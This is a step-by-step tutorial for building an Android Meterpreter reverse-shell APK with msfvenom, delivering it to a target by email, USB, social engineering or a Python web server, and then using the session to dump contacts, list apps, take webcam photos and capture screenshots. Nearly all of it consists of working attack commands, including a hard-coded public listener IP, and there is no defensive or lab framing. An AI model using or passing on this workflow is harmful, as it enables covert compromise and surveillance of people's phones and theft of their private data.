# Metasploit Exploitation Workflow

## Step 1: Download and Install Metasploit

   - Download Metasploit from the official website or repository.
   - Follow the installation instructions for your operating system.

## Step 2: Start Metasploit Framework

   - Open a terminal and start Metasploit:
     ```bash
     msfconsole
     ```

## Step 3: Generate Payload

   - Use `msfvenom` to create a payload. For example, create a reverse TCP Meterpreter payload:
     ```bash
     msfvenom -p android/meterpreter/reverse_tcp LHOST=52.66.204.1 LPORT=4444 -o hack_akhilesh.apk ANDROID_VERSION=10
     ```
     Replace `your_ip_address` and `your_port` with your public IP address and desired port.

## Step 4: Set Up a Listener

   - In Metasploit, set up a listener to catch the incoming connection:
     ```bash
     use exploit/multi/handler
     set PAYLOAD android/meterpreter/reverse_tcp
     set LHOST your_ip_address
     set LPORT your_port
     exploit
     ```

   - Ensure that the listener is running and waiting for the connection.

## Step 5: Download the Payload to Target Device

- Transfer the generated payload (`hack_akhilesh.apk`) to the target device. You can use various methods such as email, USB, or other social engineering techniques.

    Here I'll be using with http protocol

    1. Run a python server

       ```bash
       python3 -m http.server 4444
       ```
    2. Browse `http://52.66.204.1:4444/hack_akhilesh.apk` to download the file

    3. Install it.

## Step 6: Exploit the Target

Run exploit
   ```bash
   exploit -j
   ```

Check all active Sessions
   ```bash
   sessions
   ```

Target the specific session for example 3
   ```bash
   sessions -i 3
   ```

* Now you are inside the `meterpreter>` prompt

Get Help
   ```bash
   help
   ```
Get System Information
   ```bash
   sysinfo
   ```

Contacts
   ```bash
   dump_contacts
   ```

App Lists
   ```bash
   app_lists
   ```

Capture an image
   ```bash
   webcam_snap -i 1 -o /sdcard/captured_image.jpg
   ```

Capture Screenshots
   ```bash
   screenshots
   ```

And much more...

Happy Coding!
